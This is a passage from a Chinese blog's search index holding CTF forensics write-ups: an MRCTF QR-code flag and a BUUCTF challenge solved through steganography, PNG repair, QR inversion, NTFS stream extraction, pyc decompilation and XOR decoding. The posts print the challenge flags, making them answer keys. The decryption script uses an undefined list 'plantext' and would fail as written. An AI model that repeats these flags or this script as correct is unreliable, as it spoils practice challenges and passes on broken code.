class="line">img.show()</span><br></pre></td></tr></table></figure><p><em><strong>上面两个代码任意选择一个即可。</strong></em></p><br><h1 id="5-成功拿到二维码"><a href="#5-成功拿到二维码" class="headerlink" title="5.成功拿到二维码"></a>5.成功拿到二维码</h1><p><img src="/"><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-07-12_14-31-13.png" alt="Snipaste_2022-07-12_14-31-13"></p><p><em><strong>扫描二维码，成功拿到flag：</strong></em></p><p>​<strong>MRCTF{ta01uyout1nreet1n0usandtimes}</strong></p><p><em><strong>改成flag{}这种形式，如下：</strong></em></p><p>​<strong>flag{ta01uyout1nreet1n0usandtimes}</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-喵喵喵</title>
      <link href="/posts/43080.html"/>
      <url>/posts/43080.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-LSB隐写"><a href="#1-LSB隐写" class="headerlink" title="1.LSB隐写"></a>1.LSB隐写</h2><p>​使用Stegsolve去<strong>BGR</strong>通道拿到一张png（有问题的）的图片，保存二进制文件即可。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-07-11_18-10-52-16575358395678.png"></p><h2 id="2-png的图片需要修复"><a href="#2-png的图片需要修复" class="headerlink" title="2.png的图片需要修复"></a>2.png的图片需要修复</h2><h5 id="1-修复图片的文件头部（删除fffe）"><a href="#1-修复图片的文件头部（删除fffe）" class="headerlink" title="1.修复图片的文件头部（删除fffe）"></a>1.修复图片的文件头部（删除fffe）</h5><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-07-11_18-13-01.png"></p><h5 id="2-使用png一键脚本修复png的高宽问题"><a href="#2-使用png一键脚本修复png的高宽问题" class="headerlink" title="2.使用png一键脚本修复png的高宽问题"></a>2.使用png一键脚本修复png的高宽问题</h5><p>经过上一步的修复，现在图片可以查看了，如图：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-07-11_18-36-30-165753586958611.png"></p><p>由于图片的是一张二维码的上部分，加上图片是png格式，所以很正常就想到了是png高宽问题。</p><p>这个步骤我使用的是github开源项目链接：</p><p><a href="https://github.com/Southseast/PNG_Height_Steganography">https://github.com/Southseast/PNG_Height_Steganography</a></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-07-11_18-54-08.png"></p><p>这地方比较简单，跳过了，不会使用的看他的使用文档即可食用！</p><h2 id="3-二维码处理"><a href="#3-二维码处理" class="headerlink" title="3.二维码处理"></a>3.二维码处理</h2><p>经过上一步的处理，二维码已经拿到，如图：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-07-11_18-21-25-165753588337613.png"></p><p>仔细观察的话可以发现二维码的颜色有很大问题的，他的3个定位标志的颜色不对劲</p><p>如果看不出来的话，你们可以看一下正常的二维码，如图：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-07-11_18-25-11.png"></p><p>原理：让二维码的黑色变白色，白色变黑色，也就是每个像素点255的变成0，0的变成255，即可让二维码恢复正常的样貌。</p><h5 id="代码如下"><a href="#代码如下" class="headerlink" title="代码如下"></a>代码如下</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">img = cv2.imread(<span class="string">&quot;1.png&quot;</span>)</span><br><span class="line"></span><br><span class="line">img = np.where(img == <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>)</span><br><span class="line">img = img.astype(np.uint8)</span><br><span class="line"></span><br><span class="line">cv2.imshow(<span class="string">&quot;image&quot;</span>, img)</span><br><span class="line">cv2.waitKey(<span class="number">0</span>)</span><br><span class="line">cv2.destroyAllWindows()</span><br></pre></td></tr></table></figure><h2 id="4-处理flag-rar"><a href="#4-处理flag-rar" class="headerlink" title="4.处理flag.rar"></a>4.处理flag.rar</h2><h5 id="1-扫描二维码下载百度云盘的文件（flag-rar）"><a href="#1-扫描二维码下载百度云盘的文件（flag-rar）" class="headerlink" title="1.扫描二维码下载百度云盘的文件（flag.rar）"></a>1.扫描二维码下载百度云盘的文件（flag.rar）</h5><h5 id="2-拿到rar文件后，解压开来（推荐使用winrar解压，不然可能隐藏的ntfs扫描不出来）"><a href="#2-拿到rar文件后，解压开来（推荐使用winrar解压，不然可能隐藏的ntfs扫描不出来）" class="headerlink" title="2.拿到rar文件后，解压开来（推荐使用winrar解压，不然可能隐藏的ntfs扫描不出来）"></a>2.拿到rar文件后，解压开来（推荐使用winrar解压，不然可能隐藏的ntfs扫描不出来）</h5><h5 id="3-使用NSE工具扫描，扫描结果是flag-txt-flag-pyc，如图："><a href="#3-使用NSE工具扫描，扫描结果是flag-txt-flag-pyc，如图：" class="headerlink" title="3.使用NSE工具扫描，扫描结果是flag.txt:flag.pyc，如图："></a>3.使用NSE工具扫描，扫描结果是flag.txt:flag.pyc，如图：</h5><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-07-11_17-46-48-16575358188725.png"></p><h5 id="4-勾选然后导出pyc格式文件即可。"><a href="#4-勾选然后导出pyc格式文件即可。" class="headerlink" title="4.勾选然后导出pyc格式文件即可。"></a>4.勾选然后导出pyc格式文件即可。</h5><p>​<strong>pyc格式是由py文件经过编译后&#x3D;&#x3D;二进制&#x3D;&#x3D;文件</strong></p><h2 id="5-反汇编pyc代码"><a href="#5-反汇编pyc代码" class="headerlink" title="5.反汇编pyc代码"></a>5.反汇编pyc代码</h2><h5 id="1-安装uncompyle库"><a href="#1-安装uncompyle库" class="headerlink" title="1.安装uncompyle库"></a>1.安装uncompyle库</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install uncompyle</span><br></pre></td></tr></table></figure><h5 id="2-使用uncomply6去反汇编pyc"><a href="#2-使用uncomply6去反汇编pyc" class="headerlink" title="2.使用uncomply6去反汇编pyc"></a>2.使用uncomply6去反汇编pyc</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uncompyle6 xxx.pyc &gt; main.py</span><br></pre></td></tr></table></figure><h5 id="3-反汇编出来的代码如下："><a href="#3-反汇编出来的代码如下：" class="headerlink" title="3.反汇编出来的代码如下："></a>3.反汇编出来的代码如下：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>():</span><br><span class="line">    flag = <span class="string">&#x27;*************&#x27;</span></span><br><span class="line">    ciphertext = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">        s = <span class="built_in">chr</span>(i ^ <span class="built_in">ord</span>(flag[i]))</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            s = <span class="built_in">ord</span>(s) + <span class="number">10</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s = <span class="built_in">ord</span>(s) - <span class="number">10</span></span><br><span class="line">        ciphertext.append(<span class="built_in">str</span>(s))</span><br><span class="line">    <span class="keyword">return</span> ciphertext[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">ciphertext = [</span><br><span class="line"> <span class="string">&#x27;96&#x27;</span>, <span class="string">&#x27;65&#x27;</span>, <span class="string">&#x27;93&#x27;</span>, <span class="string">&#x27;123&#x27;</span>, <span class="string">&#x27;91&#x27;</span>, <span class="string">&#x27;97&#x27;</span>, <span class="string">&#x27;22&#x27;</span>, <span class="string">&#x27;93&#x27;</span>, <span class="string">&#x27;70&#x27;</span>, <span class="string">&#x27;102&#x27;</span>, <span class="string">&#x27;94&#x27;</span>, <span class="string">&#x27;132&#x27;</span>, <span class="string">&#x27;46&#x27;</span>, <span class="string">&#x27;112&#x27;</span>, <span class="string">&#x27;64&#x27;</span>, <span class="string">&#x27;97&#x27;</span>, <span class="string">&#x27;88&#x27;</span>, <span class="string">&#x27;80&#x27;</span>, <span class="string">&#x27;82&#x27;</span>, <span class="string">&#x27;137&#x27;</span>, <span class="string">&#x27;90&#x27;</span>, <span class="string">&#x27;109&#x27;</span>, <span class="string">&#x27;99&#x27;</span>, <span class="string">&#x27;112&#x27;</span>]</span><br></pre></td></tr></table></figure><h5 id="4-分析一下代码的情况"><a href="#4-分析一下代码的情况" class="headerlink" title="4.分析一下代码的情况"></a>4.分析一下代码的情况</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encode() --&gt; 根据名称能推理出来是个加密函数</span><br><span class="line">ciphertext --&gt; 由encode()加密出来的</span><br></pre></td></tr></table></figure><h5 id="5-进一步分析encode-函数如何加密："><a href="#5-进一步分析encode-函数如何加密：" class="headerlink" title="5.进一步分析encode()函数如何加密："></a>5.进一步分析encode()函数如何加密：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>():</span><br><span class="line">    flag = <span class="string">&#x27;*************&#x27;</span></span><br><span class="line">    ciphertext = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">        <span class="comment"># 1.索引i 异或(^) flag第i个的元素的ascii的十进制数</span></span><br><span class="line">        <span class="comment">#然后再转成ascii</span></span><br><span class="line">        s = <span class="built_in">chr</span>(i ^ <span class="built_in">ord</span>(flag[i]))</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 2.如果i能被二整除就给ascii转换为十进制再 + 10，否则 - 10</span></span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            s = <span class="built_in">ord</span>(s) + <span class="number">10</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s = <span class="built_in">ord</span>(s) - <span class="number">10</span></span><br><span class="line">        ciphertext.append(<span class="built_in">str</span>(s)) <span class="comment"># 3.把处理好的数据加入到列表中</span></span><br><span class="line">    <span class="keyword">return</span> ciphertext[::-<span class="number">1</span>] <span class="comment"># 4.对加密好ciphertext的进行倒序</span></span><br></pre></td></tr></table></figure><h5 id="6-根据上一步进行倒退代码处理ciphertext，就是步骤反着来，解密代码："><a href="#6-根据上一步进行倒退代码处理ciphertext，就是步骤反着来，解密代码：" class="headerlink" title="6.根据上一步进行倒退代码处理ciphertext，就是步骤反着来，解密代码："></a>6.根据上一步进行倒退代码处理ciphertext，就是步骤反着来，解密代码：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 密文</span></span><br><span class="line">ciphertext = [</span><br><span class="line"> <span class="string">&#x27;96&#x27;</span>, <span class="string">&#x27;65&#x27;</span>, <span class="string">&#x27;93&#x27;</span>, <span class="string">&#x27;123&#x27;</span>, <span class="string">&#x27;91&#x27;</span>, <span class="string">&#x27;97&#x27;</span>, <span class="string">&#x27;22&#x27;</span>, <span class="string">&#x27;93&#x27;</span>, <span class="string">&#x27;70&#x27;</span>, <span class="string">&#x27;102&#x27;</span>, <span class="string">&#x27;94&#x27;</span>, <span class="string">&#x27;132&#x27;</span>, <span class="string">&#x27;46&#x27;</span>, <span class="string">&#x27;112&#x27;</span>, <span class="string">&#x27;64&#x27;</span>, <span class="string">&#x27;97&#x27;</span>, <span class="string">&#x27;88&#x27;</span>, <span class="string">&#x27;80&#x27;</span>, <span class="string">&#x27;82&#x27;</span>, <span class="string">&#x27;137&#x27;</span>, <span class="string">&#x27;90&#x27;</span>, <span class="string">&#x27;109&#x27;</span>, <span class="string">&#x27;99&#x27;</span>, <span class="string">&#x27;112&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.先对密文进行倒序</span></span><br><span class="line">ciphertext = ciphertext[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ciphertext)):</span><br><span class="line">    <span class="comment"># 2.如果i能被二整除就给十进制数 - 10，否则 + 10.（和加密的关系反过来）</span></span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        s = <span class="built_in">int</span>(ciphertext[i]) - <span class="number">10</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = <span class="built_in">int</span>(ciphertext[i]) + <span class="number">10</span></span><br><span class="line"></span><br><span class="line">   <span class="comment"># 3.异或然后再转换为ascii就得出明文</span></span><br><span class="line">    plantext.append(<span class="built_in">chr</span>(<span class="built_in">int</span>(i ^ s)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.打印flag</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(plantext))</span><br></pre></td></tr></table></figure><h5 id="7-运行上面的解密代码"><a href="#7-运行上面的解密代码" class="headerlink" title="7.运行上面的解密代码"></a>7.运行上面的解密代码</h5><p>​<strong>flag{Y@e_Cl3veR_C1Ever!}</strong></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
